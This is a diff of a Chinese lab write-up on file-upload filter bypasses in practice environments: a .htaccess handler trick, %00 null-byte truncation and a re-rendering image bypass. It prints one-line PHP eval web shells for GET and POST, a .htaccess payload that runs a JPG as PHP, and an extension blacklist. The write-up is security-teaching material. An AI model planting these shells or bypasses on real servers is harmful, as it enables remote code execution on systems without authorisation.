@@ -76,9 +76,101 @@ mv info.php info.png
 前提条件：   
 * mod_rewrite模块开启。
 * AllowOverride All。
-### 2.1 
+### 2.1 查看服务端源码，黑名单明细。
+```php
+ $deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");
+```
+并没有包含 `.htaccess` 文件。
+### 2.2 编写 `.htaccess` 文件
+```xml
+ <FilesMatch "info.jpg"> 
+    Sethandler application/x-httpd-php 
+ </FilesMatch>
+```
+仅对 `info.jpg` 生效。
+```xml
+ <IfModule mime_module>
+  SetHandler application/x-httpd-php 
+ </IfModule>
+```
+对目录下所有文件生效。选择第一种，不会影响其他业务。
+### 2.3 上传 `.htaccess` 文件
+* Mac遇到的问题，`.htaccess` 属于隐藏文件，点击浏览找不到这个文件，修改为`1.htaccess`进行上传，然后使用`burp`抓包后，再修改文件名称。   
+![Alt text](image-23.png)
+![Alt text](image-24.png)
+![Alt text](image-26.png)   
+尝试访问
+![Alt text](image-27.png)
+### 2.4 上传 `info.jpg` 文件
+![Alt text](image-25.png)   
+尝试访问
+![Alt text](image-28.png)
 ## 3. 服务端白名单绕过：%00 截断绕过，要求虚拟机中搭建实验环境，分别实现 GET、POST 方法的绕过。
-## 4. 二次渲染绕过。
+### 3.1 原理
+由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\0作为字符串的结尾，所以\0也被称为字符串结束标志，或者字符串结束符。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\0字符的方式，达到字符串截断的目的。\0要求在经过服务解析后最终在系统中执行时的样式，所以不能直接使用\0，一般使用%00(url编码),0x00(16进制)。这样的下面的url：
+```url
+ http://wwww.XXX.com/upload/aaa.php%00bbb.jpg
+```
+整个 `aaa.php%00bbb.jpg` 会在应用层面绕过白名单的限制，但是在系统层面会被解析为 `aaa.php\0bbb.jpg`,`\0`会被认为是结束，所以最终会以`aaa.php`保存至服务器。
+### 3.2 利用条件
+* php版本小于5.3.4   
+* php.ini的magic_quotes_gpc为OFF状态   
+* 操作系统是C语言或汇编语言编写
+### 3.3 环境搭建
+#### 3.3.1 windows虚拟机中安装`phpStudy`
+![Alt text](image-29.png)
+#### 3.3.2 切换php版本
+![Alt text](image-30.png)
+#### 3.3.3 修改php.ini的`magic_quotes_gpc`为`OFF`
+![Alt text](image-31.png)   
+![Alt text](image-32.png)
+#### 3.3.4 将文件放入网站根目录中
+![Alt text](image-33.png)
+![Alt text](image-34.png)   
+#### 3.3.5 启动服务，并访问
+![Alt text](image-35.png)
+![Alt text](image-36.png)   
+查看虚拟机中ip，尝试物理机访问该地址。
+![Alt text](image-37.png)   
+![Alt text](image-38.png)
+### 3.4 GET方式绕过（虚拟机中Pass-11）
+```php
+ <?php eval(@$_GET['a']);?>
+```
+#### 3.4.1 选择`info.jpg`，上传
+![Alt text](image-39.png)
+#### 3.4.2 打开 `Burp` 抓包拦截，在请求路径中添加"%00"
+![Alt text](image-40.png)
+#### 3.4.3 访问
+![Alt text](image-41.png)
+### 3.5 POST方式绕过（虚拟机中Pass-11）
+```php
+ <?php eval(@$_POST['a']);?>
+```
+#### 3.5.1 上传方式和GET一样
+![Alt text](image-42.png)
+#### 3.5.2 访问
+![Alt text](image-43.png)
+## 4. 二次渲染绕过。（Pass-17）
+### 4.1 工具下载 `Hex Fiend`
+![Alt text](image-44.png)
+### 4.2 概念
+* 二次渲染：是根据用户上传的图片，新生成一个图片，将原始图片删除，将新图片添加到数据库中。比如一些网站根据用户上传的头像生成大中小不同尺寸的图像。
+### 4.3 正常上传前后图片比对
+![Alt text](image-45.png)   
+保存已上传上去的图片为`tu2.png`
+![Alt text](image-46.png)
+* 问题：`Hex Fiend` 工具未找到对比功能，暂时使用windows虚拟机中的`010 editor`来对比。
+* 解决方法：打开两个文件后，点击`file`,选择 `compare 文件1 and 文件2`,就可以了
+![Alt text](image-47.png)   
+* 问题：可操作空间太少了，换gif图片来时，换`1.gif`
+![Alt text](image-49.png)
+### 4.4 图片中添加一句话木马，然后再次上传
+![Alt text](image-48.png)
+下载图片，另存为`3.gif`，查看一句话木马是否被渲染去掉了。
+![Alt text](image-50.png)
+### 4.5 使用文件包含漏洞访问被渲染过的图片。
+![Alt text](image-51.png)
 # 二、文件包含
 ## 1. DVWA 环境下包含其他目录的任意 3 个文件，要求使用相对路径。
 ## 2. 远程文件包含。
